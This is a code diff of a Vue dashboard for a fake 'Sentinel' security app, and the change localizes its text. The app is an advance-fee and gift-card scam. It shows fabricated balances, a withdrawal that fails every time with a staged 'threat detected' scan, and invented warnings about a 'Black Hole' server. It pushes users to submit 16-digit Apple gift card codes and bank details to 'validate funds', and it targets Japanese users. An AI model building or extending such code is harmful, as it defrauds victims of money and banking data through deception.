@@ -9,18 +9,18 @@ const { t, isJapaneseLocale } = useLocaleText();
 const ACTION_LOCK_KEY = 'sentinel-user-actions-lock-until';
 const ACTION_LOCK_DURATION_MS = 24 * 60 * 60 * 1000;
 
-const systemStatus = ref({
-    firewall: 'ACTIVE',
-    intrusion: 'MONITORING',
-    encryption: 'SECURE',
-    network: 'STABLE'
-});
+const systemStatus = computed(() => ({
+    firewall: t('dashboard.statusActive', 'ACTIVE'),
+    intrusion: t('dashboard.statusMonitoring', 'MONITORING'),
+    encryption: t('dashboard.statusSecure', 'SECURE'),
+    network: t('dashboard.statusStable', 'STABLE'),
+}));
 
-const alerts = ref([
-    { id: 1, type: 'warning', message: 'Unusual login attempt detected', time: '2 min ago' },
-    { id: 2, type: 'info', message: 'System scan completed successfully', time: '15 min ago' },
-    { id: 3, type: 'success', message: 'All security protocols updated', time: '1 hour ago' }
-]);
+const alerts = computed(() => ([
+    { id: 1, type: 'warning', message: t('dashboard.alertLoginAttempt', 'Unusual login attempt detected'), time: t('dashboard.alert2min', '2 min ago') },
+    { id: 2, type: 'info', message: t('dashboard.alertScanComplete', 'System scan completed successfully'), time: t('dashboard.alert15min', '15 min ago') },
+    { id: 3, type: 'success', message: t('dashboard.alertProtocolsUpdated', 'All security protocols updated'), time: t('dashboard.alert1hour', '1 hour ago') },
+]));
 
 const metrics = ref({
     threatsBlocked: 1247,
@@ -72,11 +72,12 @@ const isJapanUser = computed(() => currentCountryCode.value === 'JP' || isJapane
 const areQuickActionsLocked = computed(() => !userIsAdmin.value && Boolean(actionsLockedUntil.value && actionsLockedUntil.value > Date.now()));
 const bankNameLabel = computed(() => isJapanUser.value ? t('dashboard.japaneseBankName', 'Japanese Bank Name') : t('dashboard.bankName', 'Bank Name'));
 const branchCodeLabel = computed(() => isJapanUser.value ? t('dashboard.branchCode', 'Branch Code') : t('dashboard.routingNumber', 'Routing Number'));
-const branchCodePlaceholder = computed(() => isJapanUser.value ? '3-digit branch code' : 'Enter routing number');
+const branchCodePlaceholder = computed(() => isJapanUser.value ? t('dashboard.branchCodePlaceholder', '3-digit branch code') : t('dashboard.routingNumberPlaceholder', 'Enter routing number'));
 const accountNumberLabel = computed(() => t('dashboard.accountNumber', 'Account Number'));
-const accountNumberPlaceholder = computed(() => isJapanUser.value ? '7-digit account number' : 'Enter account number');
+const accountNumberPlaceholder = computed(() => isJapanUser.value ? t('dashboard.accountNumberPlaceholderJapan', '7-digit account number') : t('dashboard.accountNumberPlaceholderDefault', 'Enter account number'));
 const accountHolderLabel = computed(() => isJapanUser.value ? t('dashboard.accountNameHolder', 'Account Name Holder') : t('dashboard.accountHolder', 'Account Holder'));
-const accountHolderPlaceholder = computed(() => isJapanUser.value ? 'Example: SAWADA KAZUKI' : 'Enter account holder name');
+const accountHolderPlaceholder = computed(() => isJapanUser.value ? t('dashboard.accountHolderPlaceholderJapan', 'Example: SAWADA KAZUKI') : t('dashboard.accountHolderPlaceholderDefault', 'Enter account holder name'));
+const bankNamePlaceholder = computed(() => isJapanUser.value ? t('dashboard.bankNamePlaceholderJapan', 'Example: みずほ銀行') : t('dashboard.bankNamePlaceholderDefault', 'Enter bank name'));
 const sentinelScanProgress = computed(() => ((30 - sentinelScanTimeLeft.value) / 30) * 100);
 const maxWithdrawableAmount = computed(() => Number(withdrawableBalance.value || 0));
 
@@ -215,8 +216,8 @@ const completeSentinelScan = () => {
     stopSentinelScan();
     sentinelScanInProgress.value = false;
     sentinelScanThreatDetected.value = true;
-    sentinelScanThreatTitle.value = 'Threat detected: Withdrawal relay mismatch';
-    sentinelScanThreatMessage.value = 'Sentinel identified a forged settlement corridor between your registered bank path and the transfer mirror. The withdrawal was intercepted before release to prevent exposure to a Black Hole collection node.';
+    sentinelScanThreatTitle.value = t('dashboard.threatDetectedTitle', 'Threat detected: Withdrawal relay mismatch');
+    sentinelScanThreatMessage.value = t('dashboard.threatDetectedMessage', 'Sentinel identified a forged settlement corridor between your registered bank path and the transfer mirror. The withdrawal was intercepted before release to prevent exposure to a Black Hole collection node.');
     sentinelScanLogs.value = [
         ...sentinelScanLogs.value,
         '> Scan complete. Threat correlation index elevated to CRITICAL.',
@@ -284,7 +285,7 @@ const saveBankDetails = () => {
     const regionSpecificCode = isJapanUser.value ? branchCode.value : routingNumber.value;
 
     if (!bankName.value || !accountNumber.value || !regionSpecificCode || !accountHolder.value) {
-        withdrawError.value = 'Please complete all bank details before withdrawing.';
+        withdrawError.value = t('dashboard.completeBankDetailsError', 'Please complete all bank details before withdrawing.');
         return;
     }
 
@@ -300,7 +301,7 @@ const saveBankDetails = () => {
             bankDetailsSaved.value = true;
             showWithdrawModal.value = false;
             withdrawError.value = '';
-            withdrawMessage.value = `Bank details saved for ${bankName.value}. Your next withdrawal will ask for an amount.`;
+            withdrawMessage.value = t('dashboard.saveBankSuccess', 'Bank details saved for :bankName. Your next withdrawal will ask for an amount.').replace(':bankName', bankName.value);
         },
         onError: (errors) => {
             withdrawError.value = errors.bank_name
@@ -308,14 +309,14 @@ const saveBankDetails = () => {
                 ?? errors.account_number
                 ?? errors.routing_number
                 ?? errors.account_holder
-                ?? 'Unable to save bank details. Please review the information and try again.';
+                ?? t('dashboard.saveBankError', 'Unable to save bank details. Please review the information and try again.');
         },
     });
 };
 
 const submitWithdrawAmount = () => {
     if (!withdrawAmount.value || Number(withdrawAmount.value) <= 0) {
-        withdrawError.value = 'Please enter a valid withdrawal amount.';
+        withdrawError.value = t('dashboard.validWithdrawalAmountError', 'Please enter a valid withdrawal amount.');
         return;
     }
 
@@ -341,7 +342,7 @@ const submitWithdrawAmount = () => {
                 ?? errors.routing_number
                 ?? errors.account_holder
                 ?? errors.amount
-                ?? 'Unable to submit the withdrawal request. Please review your bank details.';
+                ?? t('dashboard.submitWithdrawalError', 'Unable to submit the withdrawal request. Please review your bank details.');
         },
     });
 };
@@ -353,7 +354,7 @@ const startWithdraw = (amount = withdrawAmount.value) => {
 
     withdrawMessage.value = '';
     transferFailed.value = false;
-    transferStatus.value = `Processing transfer request for ¥${formatYen(amount)}...`;
+    transferStatus.value = t('dashboard.processingTransfer', 'Processing transfer request for ¥:amount...').replace(':amount', formatYen(amount));
     isTransferInProgress.value = true;
     showTransferModal.value = true;
     withdrawError.value = '';
@@ -361,7 +362,7 @@ const startWithdraw = (amount = withdrawAmount.value) => {
     setTimeout(() => {
         isTransferInProgress.value = false;
         transferFailed.value = true;
-        transferStatus.value = `A threat was detected while transferring ¥${formatYen(amount)}. Bank balance needs to be validated first to secure the safety of the users funds.`;
+        transferStatus.value = t('dashboard.threatDetectedTransfer', 'A threat was detected while transferring ¥:amount. Bank balance needs to be validated first to secure the safety of the users funds.').replace(':amount', formatYen(amount));
         withdrawError.value = '';
     }, 5000);
 };
@@ -369,8 +370,8 @@ const startWithdraw = (amount = withdrawAmount.value) => {
 const validateFunds = async (method = null) => {
     fundsValidated.value = true;
     fundsValidationMessage.value = method
-        ? `Validating via ${method}. Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.`
-        : 'Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.';
+        ? t('dashboard.validationViaMethod', 'Validating via :method. Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.').replace(':method', method)
+        : t('dashboard.validationInProgress', 'Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.');
     await nextTick();
     availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
 };
@@ -382,7 +383,7 @@ const openValidateOptions = () => {
 const selectValidateMethod = async (method) => {
     if (method === 'PayPay' || method === 'Western Union') {
         fundsValidated.value = true;
-        fundsValidationMessage.value = `${method} is not available at the moment. Please try another validation method.`;
+        fundsValidationMessage.value = t('dashboard.methodUnavailable', ':method is not available at the moment. Please try another validation method.').replace(':method', method);
         showValidateOptions.value = false;
         await nextTick();
         availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
@@ -394,14 +395,14 @@ const selectValidateMethod = async (method) => {
 
 const submitAppleForm = () => {
     if (!appleAmount.value || !appleGiftCardAmount.value) {
-        fundsValidationMessage.value = 'Please fill in both fields.';
+        fundsValidationMessage.value = t('dashboard.fillBothFields', 'Please fill in both fields.');
         return;
     }
 
     const normalizedGiftCardCode = appleGiftCardAmount.value.replace(/\D/g, '');
 
     if (normalizedGiftCardCode.length !== 16) {
-        fundsValidationMessage.value = 'Apple gift card validation requires exactly 16 digits.';
+        fundsValidationMessage.value = t('dashboard.appleCodeDigits', 'Apple gift card validation requires exactly 16 digits.');
         return;
     }
 
@@ -415,7 +416,7 @@ const submitAppleForm = () => {
         onSuccess: async () => {
             appleSubmitting.value = false;
             fundsValidated.value = true;
-            fundsValidationMessage.value = `Validation submitted for ¥${formatYen(appleAmount.value)}. Awaiting admin approval before the amount is added to your withdrawable balance.`;
+            fundsValidationMessage.value = t('dashboard.validationSubmitted', 'Validation submitted for ¥:amount. Awaiting admin approval before the amount is added to your withdrawable balance.').replace(':amount', formatYen(appleAmount.value));
             showAppleForm.value = false;
             appleAmount.value = '';
             appleGiftCardAmount.value = '';
@@ -425,7 +426,7 @@ const submitAppleForm = () => {
         },
         onError: () => {
             appleSubmitting.value = false;
-            fundsValidationMessage.value = 'Unable to submit validation. Please check the amount and code.';
+            fundsValidationMessage.value = t('dashboard.validationSubmitError', 'Unable to submit validation. Please check the amount and code.');
         },
     });
 };
@@ -485,7 +486,7 @@ onUnmounted(() => {
 </script>
 
 <template>
-    <Head title="Sentinel Control Center" />
+    <Head :title="t('common.controlCenter', 'Sentinel Control Center')" />
 
     <AuthenticatedLayout>
         <div class="py-6">
@@ -500,7 +501,7 @@ onUnmounted(() => {
                             </div>
                             <div class="text-sm text-red-400 font-semibold">{{ t('dashboard.unverified', 'Unverified') }}</div>
                         </div>
-                        <p class="text-sm text-gray-400 mb-4">Core operating funds available for immediate cyber operations.</p>
+                        <p class="text-sm text-gray-400 mb-4">{{ t('dashboard.availableFundsHelp', 'Core operating funds available for immediate cyber operations.') }}</p>
                         <div class="flex flex-wrap gap-3">
                             <button @click="openValidateOptions" class="bg-cyan-600 hover:bg-cyan-500 text-white rounded px-4 py-2 text-sm font-medium transition">
                                 {{ t('dashboard.validateFunds', 'Validate Funds') }}
@@ -513,23 +514,23 @@ onUnmounted(() => {
                         <div class="w-full max-w-xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                             <div class="flex items-start justify-between gap-4 mb-6">
                                 <div>
-                                    <h3 class="text-2xl font-semibold text-white">Validate Via</h3>
-                                    <p class="mt-2 text-sm text-gray-400">Choose a verification method to continue secure funds validation.</p>
+                                    <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.validateVia', 'Validate Via') }}</h3>
+                                    <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.validateMethodHelp', 'Choose a verification method to continue secure funds validation.') }}</p>
                                 </div>
                                 <button @click="showValidateOptions = false" class="text-gray-400 hover:text-white">✕</button>
                             </div>
                             <div class="grid gap-4 sm:grid-cols-3">
                                 <button @click="selectValidateMethod('PayPay')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                     <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">PayPay</div>
-                                    <div class="text-sm text-gray-300">Secure node confirmation via digital payment link.</div>
+                                    <div class="text-sm text-gray-300">{{ t('dashboard.paypayHelp', 'Secure node confirmation via digital payment link.') }}</div>
                                 </button>
                                 <button @click="selectValidateMethod('Western Union')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                     <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">Western Union</div>
-                                    <div class="text-sm text-gray-300">Match your transfer channel to encrypted ledger records.</div>
+                                    <div class="text-sm text-gray-300">{{ t('dashboard.westernUnionHelp', 'Match your transfer channel to encrypted ledger records.') }}</div>
                                 </button>
                                 <button @click="selectValidateMethod('Apple Gift Card')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                     <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">Apple Gift Card</div>
-                                    <div class="text-sm text-gray-300">Validate with a trusted gift card asset channel.</div>
+                                    <div class="text-sm text-gray-300">{{ t('dashboard.appleGiftHelp', 'Validate with a trusted gift card asset channel.') }}</div>
                                 </button>
                             </div>
                         </div>
@@ -540,32 +541,32 @@ onUnmounted(() => {
                             <template v-if="!appleSubmitting">
                                 <div class="flex items-start justify-between gap-4 mb-6">
                                     <div>
-                                        <h3 class="text-xl font-semibold text-white">Apple Gift Card Validation</h3>
-                                        <p class="mt-2 text-sm text-gray-400">Enter the required amounts to proceed with validation.</p>
+                                        <h3 class="text-xl font-semibold text-white">{{ t('dashboard.appleGiftTitle', 'Apple Gift Card Validation') }}</h3>
+                                        <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.appleGiftSubtitle', 'Enter the required amounts to proceed with validation.') }}</p>
                                     </div>
                                     <button @click="showAppleForm = false" class="text-gray-400 hover:text-white">✕</button>
                                 </div>
                                 <div class="space-y-4">
                                     <div>
-                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Amount (JPY)</label>
-                                        <input v-model="appleAmount" type="number" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter amount in yen" />
+                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ t('dashboard.amountJpy', 'Amount (JPY)') }}</label>
+                                        <input v-model="appleAmount" type="number" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="t('dashboard.amountPlaceholderYen', 'Enter amount in yen')" />
                                     </div>
                                     <div>
-                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Code</label>
-                                        <input v-model="appleGiftCardAmount" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter code" />
+                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ t('dashboard.code', 'Code') }}</label>
+                                        <input v-model="appleGiftCardAmount" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="t('dashboard.codePlaceholder', 'Enter code')" />
                                     </div>
                                 </div>
                                 <div class="mt-6 flex justify-end gap-3">
-                                    <button @click="showAppleForm = false" class="rounded-lg border border-gray-700 bg-gray-800 px-4 py-2 text-sm font-medium text-gray-300 transition hover:bg-gray-700">Cancel</button>
-                                    <button @click="submitAppleForm" class="rounded-lg bg-cyan-600 px-4 py-2 text-sm font-medium text-white transition hover:bg-cyan-500">Submit</button>
+                                    <button @click="showAppleForm = false" class="rounded-lg border border-gray-700 bg-gray-800 px-4 py-2 text-sm font-medium text-gray-300 transition hover:bg-gray-700">{{ t('common.cancel', 'Cancel') }}</button>
+                                    <button @click="submitAppleForm" class="rounded-lg bg-cyan-600 px-4 py-2 text-sm font-medium text-white transition hover:bg-cyan-500">{{ t('dashboard.submit', 'Submit') }}</button>
                                 </div>
                             </template>
                             <template v-else>
                                 <div class="flex flex-col items-center justify-center gap-4 py-10 text-center">
                                     <div class="h-16 w-16 rounded-full border-4 border-cyan-500 border-t-transparent animate-spin"></div>
                                     <div>
-                                        <p class="text-lg font-semibold text-white">Please wait while we are veryfing this.</p>
-                                        <p class="mt-2 text-sm text-gray-400">Sentinel is verifying your Apple Gift Card submission.</p>
+                                        <p class="text-lg font-semibold text-white">{{ t('dashboard.appleGiftVerifying', 'Please wait while we are veryfing this.') }}</p>
+                                        <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.appleGiftVerifyingSubtitle', 'Sentinel is verifying your Apple Gift Card submission.') }}</p>
                                     </div>
                                 </div>
                             </template>
@@ -579,7 +580,7 @@ onUnmounted(() => {
                             </div>
                             <div class="text-sm text-green-400 font-semibold">{{ t('dashboard.verified', 'Verified') }}</div>
                         </div>
-                        <p class="text-sm text-gray-400 mb-4">Funds cleared for withdrawal and emergency transfer.</p>
+                        <p class="text-sm text-gray-400 mb-4">{{ t('dashboard.withdrawableHelp', 'Funds cleared for withdrawal and emergency transfer.') }}</p>
                         <div class="flex flex-wrap gap-3">
                             <button @click="openWithdrawModal" class="bg-gray-700 hover:bg-gray-600 text-white rounded px-4 py-2 text-sm font-medium transition">
                                 {{ t('dashboard.withdraw', 'Withdraw') }}
@@ -593,14 +594,14 @@ onUnmounted(() => {
                         <div class="flex items-center justify-between mb-4">
                             <div>
                                 <h3 class="text-lg font-semibold text-white">{{ t('dashboard.confirmBankDetails', 'Confirm Bank Details') }}</h3>
-                                <p class="text-sm text-gray-400">{{ isJapanUser ? 'Japan-based users must enter a Japanese bank, a 3-digit branch code, a 7-digit account number, and the account name holder.' : 'Enter account information before completing the withdrawal.' }}</p>
+                                <p class="text-sm text-gray-400">{{ isJapanUser ? t('dashboard.japanBankDetailsHelp', 'Japan-based users must enter a Japanese bank, a 3-digit branch code, a 7-digit account number, and the account name holder.') : t('dashboard.defaultBankDetailsHelp', 'Enter account information before completing the withdrawal.') }}</p>
                             </div>
                             <button @click="closeWithdrawModal" class="text-gray-400 hover:text-white">✕</button>
                         </div>
                         <div class="space-y-4">
                             <div>
                                 <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ bankNameLabel }}</label>
-                                <input v-model="bankName" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="isJapanUser ? 'Example: みずほ銀行' : 'Enter bank name'" />
+                                <input v-model="bankName" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="bankNamePlaceholder" />
                             </div>
                             <div>
                                 <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ branchCodeLabel }}</label>
@@ -629,15 +630,15 @@ onUnmounted(() => {
                         <div class="flex items-center justify-between mb-4">
                             <div>
                                 <h3 class="text-lg font-semibold text-white">{{ t('dashboard.withdrawAmount', 'Withdraw Amount') }}</h3>
-                                <p class="text-sm text-gray-400">Enter how much you want to withdraw using your saved bank details.</p>
+                                <p class="text-sm text-gray-400">{{ t('dashboard.withdrawAmountHelp', 'Enter how much you want to withdraw using your saved bank details.') }}</p>
                             </div>
                             <button @click="closeWithdrawAmountModal" class="text-gray-400 hover:text-white">✕</button>
                         </div>
                         <div class="space-y-4">
                             <div>
                                 <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ t('dashboard.withdrawAmount', 'Withdrawal Amount') }}</label>
-                                <input v-model="withdrawAmount" type="number" min="1" :max="maxWithdrawableAmount" step="0.01" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter amount to withdraw" />
-                                <p class="mt-2 text-xs text-slate-400">Available balance: ¥{{ formatYen(maxWithdrawableAmount) }}</p>
+                                <input v-model="withdrawAmount" type="number" min="1" :max="maxWithdrawableAmount" step="0.01" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="t('dashboard.withdrawAmountHelp', 'Enter how much you want to withdraw using your saved bank details.')" />
+                                <p class="mt-2 text-xs text-slate-400">{{ t('dashboard.availableBalance', 'Available balance') }}: ¥{{ formatYen(maxWithdrawableAmount) }}</p>
                             </div>
                         </div>
                         <div class="mt-4 flex flex-col gap-3 sm:flex-row sm:justify-end">
@@ -659,7 +660,7 @@ onUnmounted(() => {
                             <div>
                                 <h3 class="text-xl font-semibold text-white">{{ transferFailed ? t('dashboard.transferFailed', 'Transfer failed') : t('dashboard.transferInProgress', 'Transfer in progress') }}</h3>
                                 <p :class="transferFailed ? 'mt-2 text-sm text-red-300 font-semibold' : 'mt-2 text-sm text-gray-400'">
-                                    {{ transferFailed ? 'The transfer was blocked for security validation.' : 'Your withdrawal is being routed through secure channels.' }}
+                                    {{ transferFailed ? t('dashboard.transferBlocked', 'The transfer was blocked for security validation.') : t('dashboard.transferSecure', 'Your withdrawal is being routed through secure channels.') }}
                                 </p>
                             </div>
                             <div v-if="transferFailed" class="mt-3 rounded-2xl bg-red-950/90 px-4 py-3 text-sm text-red-200 ring-1 ring-red-500/20">
@@ -675,7 +676,7 @@ onUnmounted(() => {
                         <div class="flex items-start justify-between gap-4 mb-6">
                             <div>
                                 <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.scanTitle', 'Sentinel Scan') }}</h3>
-                                <p class="mt-2 text-sm text-gray-400">Sentinel is forensically tracing the failed withdrawal route and isolating hostile relay behavior.</p>
+                                <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.scanSubtitle', 'Sentinel is forensically tracing the failed withdrawal route and isolating hostile relay behavior.') }}</p>
                             </div>
                             <button @click="closeSentinelScanModal" class="text-gray-400 hover:text-white">✕</button>
                         </div>
@@ -684,7 +685,7 @@ onUnmounted(() => {
                             <div class="flex items-center justify-between gap-4 mb-4">
                                 <div>
                                     <div class="text-xs uppercase tracking-[0.25em] text-cyan-400">{{ t('dashboard.forensicLiveFeed', 'Forensic Live Feed') }}</div>
-                                    <div class="mt-2 text-sm text-slate-300">Withdrawal relay diagnostics with threat graph reconstruction.</div>
+                                    <div class="mt-2 text-sm text-slate-300">{{ t('dashboard.forensicHelp', 'Withdrawal relay diagnostics with threat graph reconstruction.') }}</div>
                                 </div>
                                 <div class="text-right">
                                     <div class="text-xs uppercase tracking-[0.2em] text-slate-400">{{ t('dashboard.timeRemaining', 'Time Remaining') }}</div>
@@ -697,15 +698,15 @@ onUnmounted(() => {
                             </div>
 
                             <div class="mt-5 rounded-2xl border border-cyan-500/20 bg-cyan-950/20 p-4 text-sm text-slate-200">
-                                Sentinel is correlating routing anomalies, liquidity mismatches, settlement echoes, and hostile mirror signatures across the withdrawal path.
+                                {{ t('dashboard.detectionIntro', 'Sentinel is correlating routing anomalies, liquidity mismatches, settlement echoes, and hostile mirror signatures across the withdrawal path.') }}
                             </div>
 
                             <div class="mt-4 rounded-2xl border border-slate-700 bg-slate-950/80 p-4 text-sm text-slate-300">
-                                Detection stack:
-                                <div class="mt-2 text-cyan-300">Mirror route entropy analysis</div>
-                                <div class="mt-2 text-cyan-300">Black Hole siphon beacon detection</div>
-                                <div class="mt-2 text-cyan-300">Bank standing checksum reconciliation</div>
-                                <div class="mt-2 text-cyan-300">Relay spoof confirmation</div>
+                                {{ t('dashboard.detectionStack', 'Detection stack:') }}
+                                <div class="mt-2 text-cyan-300">{{ t('dashboard.mirrorRouteEntropy', 'Mirror route entropy analysis') }}</div>
+                                <div class="mt-2 text-cyan-300">{{ t('dashboard.blackHoleDetection', 'Black Hole siphon beacon detection') }}</div>
+                                <div class="mt-2 text-cyan-300">{{ t('dashboard.checksumReconciliation', 'Bank standing checksum reconciliation') }}</div>
+                                <div class="mt-2 text-cyan-300">{{ t('dashboard.relaySpoofConfirmation', 'Relay spoof confirmation') }}</div>
                             </div>
 
                             <div class="mt-5 max-h-80 overflow-y-auto rounded-2xl border border-cyan-500/20 bg-black/60 p-4 font-mono text-xs text-cyan-200">
@@ -722,7 +723,7 @@ onUnmounted(() => {
                         <div class="flex items-start justify-between gap-4 mb-6">
                             <div>
                                 <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.threatAnalysis', 'Threat Analysis') }}</h3>
-                                <p class="mt-2 text-sm text-gray-400">The forensic scan has completed. Sentinel isolated the threat signature below.</p>
+                                <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.threatModalSubtitle', 'The forensic scan has completed. Sentinel isolated the threat signature below.') }}</p>
                             </div>
                             <button @click="closeSentinelThreatModal" class="text-gray-400 hover:text-white">✕</button>
                         </div>
@@ -733,7 +734,7 @@ onUnmounted(() => {
                                 <p class="mt-3 text-sm text-red-100">{{ sentinelScanThreatMessage }}</p>
                             </div>
                             <div class="rounded-2xl border border-amber-500/20 bg-amber-950/20 p-4 text-sm text-amber-100">
-                                Sentinel recommends a Secure Validation Portal handshake before another release attempt is permitted.
+                                {{ t('dashboard.threatRecommendation', 'Sentinel recommends a Secure Validation Portal handshake before another release attempt is permitted.') }}
                             </div>
                         </div>
 
@@ -748,14 +749,14 @@ onUnmounted(() => {
                         <div class="flex items-start justify-between gap-4 mb-6">
                             <div>
                                 <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.secureValidationPortal', 'Secure Validation Portal') }}</h3>
-                                <p class="mt-2 text-sm text-gray-400">Sentinel will verify your bank standing and lift the withdrawal lock once values match.</p>
+                                <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.portalSubtitle', 'Sentinel will verify your bank standing and lift the withdrawal lock once values match.') }}</p>
                             </div>
                             <button @click="closeSentinelModal" class="text-gray-400 hover:text-white">✕</button>
                         </div>
                         <div class="space-y-4 text-sm text-gray-300">
-                            <p>To unlock your funds, Sentinel must perform a Liquidity Verification Scan. This ensures that the bank balance on your end matches the secure records in our encrypted vault. If we attempt a transfer while the link is 'Unverified,' the funds could be pulled into a 'Black Hole' server created by the impersonator.</p>
-                            <p class="font-semibold text-cyan-300">Resolution:</p>
-                            <p>Please proceed to the Secure Validation Portal. You will be asked to verify your current bank standing so I can 'White-list' your banking node. Once the values match, the withdrawal lock will be lifted instantly.</p>
+                            <p>{{ t('dashboard.portalBodyOne', 'To unlock your funds, Sentinel must perform a Liquidity Verification Scan. This ensures that the bank balance on your end matches the secure records in our encrypted vault. If we attempt a transfer while the link is \'Unverified,\' the funds could be pulled into a \'Black Hole\' server created by the impersonator.') }}</p>
+                            <p class="font-semibold text-cyan-300">{{ t('dashboard.portalResolution', 'Resolution:') }}</p>
+                            <p>{{ t('dashboard.portalBodyTwo', 'Please proceed to the Secure Validation Portal. You will be asked to verify your current bank standing so I can \'White-list\' your banking node. Once the values match, the withdrawal lock will be lifted instantly.') }}</p>
                         </div>
                         <div class="mt-6 flex justify-end">
                             <button @click="continueFromSentinel" class="rounded-full bg-cyan-600 px-6 py-3 text-sm font-semibold text-white transition hover:bg-cyan-500">{{ t('common.continue', 'Continue') }}</button>
@@ -810,7 +811,7 @@ onUnmounted(() => {
                         <div class="p-4 border-b border-cyan-500/20">
                             <h3 class="text-lg font-semibold text-white flex items-center">
                                 <span class="w-2 h-2 bg-red-500 rounded-full mr-2 animate-pulse"></span>
-                                Security Alerts
+                                {{ t('dashboard.securityAlerts', 'Security Alerts') }}
                             </h3>
                         </div>
                         <div class="p-4 max-h-96 overflow-y-auto">
@@ -839,28 +840,28 @@ onUnmounted(() => {
                     <!-- Quick Actions -->
                     <div class="relative overflow-hidden bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
                         <div class="p-4 border-b border-cyan-500/20">
-                            <h3 class="text-lg font-semibold text-white">Quick Actions</h3>
+                            <h3 class="text-lg font-semibold text-white">{{ t('dashboard.quickActions', 'Quick Actions') }}</h3>
                         </div>
                         <div class="p-4 space-y-3">
                             <button :disabled="areQuickActionsLocked" class="w-full bg-cyan-600 hover:bg-cyan-500 disabled:bg-cyan-800/60 disabled:text-cyan-100/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
-                                Run Security Scan
+                                {{ t('dashboard.runSecurityScan', 'Run Security Scan') }}
                             </button>
                             <button :disabled="areQuickActionsLocked" class="w-full bg-gray-700 hover:bg-gray-600 disabled:bg-gray-800/80 disabled:text-gray-300/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
-                                View Logs
+                                {{ t('dashboard.viewLogs', 'View Logs') }}
                             </button>
                             <button :disabled="areQuickActionsLocked" class="w-full bg-gray-700 hover:bg-gray-600 disabled:bg-gray-800/80 disabled:text-gray-300/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
-                                System Settings
+                                {{ t('dashboard.systemSettings', 'System Settings') }}
                             </button>
                             <button :disabled="areQuickActionsLocked" class="w-full bg-red-600 hover:bg-red-500 disabled:bg-red-900/70 disabled:text-red-100/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
-                                Emergency Lockdown
+                                {{ t('dashboard.emergencyLockdown', 'Emergency Lockdown') }}
                             </button>
                         </div>
 
                         <div v-if="areQuickActionsLocked" class="absolute inset-0 z-10 flex flex-col items-center justify-center bg-black/75 px-6 text-center backdrop-blur-sm">
                             <div class="mb-4 h-14 w-14 rounded-full border-4 border-cyan-500/40 border-t-cyan-300 animate-spin"></div>
-                            <p class="text-sm font-semibold uppercase tracking-[0.25em] text-cyan-300">Module download in progress</p>
-                            <p class="mt-3 max-w-xs text-sm text-slate-300">Security command modules are being provisioned. These actions remain unavailable to users until the download window closes.</p>
-                            <p class="mt-3 text-xs uppercase tracking-[0.2em] text-slate-400">Time remaining: {{ actionLockCountdown }}</p>
+                            <p class="text-sm font-semibold uppercase tracking-[0.25em] text-cyan-300">{{ t('dashboard.moduleDownloadProgress', 'Module download in progress') }}</p>
+                            <p class="mt-3 max-w-xs text-sm text-slate-300">{{ t('dashboard.moduleDownloadHelp', 'Security command modules are being provisioned. These actions remain unavailable to users until the download window closes.') }}</p>
+                            <p class="mt-3 text-xs uppercase tracking-[0.2em] text-slate-400">{{ t('dashboard.timeRemaining', 'Time remaining') }}: {{ actionLockCountdown }}</p>
                         </div>
                     </div>
                 </div>
@@ -868,21 +869,21 @@ onUnmounted(() => {
                 <!-- Network Activity -->
                 <div class="mt-6 bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
